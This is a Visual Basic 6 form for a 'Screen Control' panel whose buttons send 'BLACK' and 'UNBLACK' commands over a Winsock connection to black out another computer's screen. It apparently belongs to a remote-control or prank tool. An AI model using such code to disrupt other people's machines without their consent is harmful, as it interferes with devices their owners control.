VERSION 5.00
Begin VB.Form Form2 
   BorderStyle     =   0  'None
   ClientHeight    =   3120
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3255
   BeginProperty Font 
      Name            =   "Verdana"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form2"
   ScaleHeight     =   3120
   ScaleWidth      =   3255
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00FFFFFF&
      Height          =   1215
      Left            =   120
      ScaleHeight     =   1155
      ScaleWidth      =   2955
      TabIndex        =   3
      Top             =   1080
      Width           =   3015
      Begin VB.Label lblScreen 
         Alignment       =   2  'Center
         BackColor       =   &H00C0FFFF&
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Left            =   720
         TabIndex        =   8
         Top             =   720
         Width           =   1575
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Current status of the screen"
         ForeColor       =   &H000000FF&
         Height          =   375
         Left            =   720
         TabIndex        =   4
         Top             =   240
         Width           =   1575
      End
   End
   Begin VB.Label lblStatus 
      BackStyle       =   0  'Transparent
      Caption         =   "Status"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   2880
      Width           =   3255
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "&Normal"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   1080
      MouseIcon       =   "Form2.frx":0000
      MousePointer    =   99  'Custom
      TabIndex        =   6
      Top             =   2520
      Width           =   975
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "&Black"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   2160
      MouseIcon       =   "Form2.frx":08CA
      MousePointer    =   99  'Custom
      TabIndex        =   5
      Top             =   2520
      Width           =   975
   End
   Begin VB.Label Label2 
      Caption         =   "The other computer  will remain with his screen black until you turn it off."
      Height          =   615
      Left            =   120
      TabIndex        =   2
      Top             =   360
      Width           =   3015
   End
   Begin VB.Label Label3 
      BackColor       =   &H00404040&
      Caption         =   "x"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3000
      MouseIcon       =   "Form2.frx":1194
      MousePointer    =   99  'Custom
      TabIndex        =   0
      Top             =   0
      Width           =   255
   End
   Begin VB.Label Label1 
      BackColor       =   &H00000000&
      Caption         =   " Screen Control"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   3255
   End
   Begin VB.Shape Shape1 
      Height          =   2655
      Left            =   0
      Top             =   240
      Width           =   3255
   End
   Begin VB.Shape Shape3 
      BackColor       =   &H00404040&
      BackStyle       =   1  'Opaque
      Height          =   240
      Left            =   0
      Top             =   2880
      Width           =   3255
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    FormDrag Me
End Sub

Private Sub Label3_Click()
    Unload Me
End Sub

Private Sub Label5_Click()
On Error Resume Next
    Form1.Winsock1.SendData "BLACK"
    
    'Status
    lblScreen.Caption = "ON (Black)"
    Picture1.BackColor = vbBlack
    lblStatus.Caption = "Complete"
End Sub

Private Sub Label6_Click()
On Error Resume Next
    Form1.Winsock1.SendData "UNBLACK"
    
    'Status
    lblScreen.Caption = "OFF (Normal)"
    Picture1.BackColor = vbWhite
    lblStatus.Caption = "Complete"
End Sub
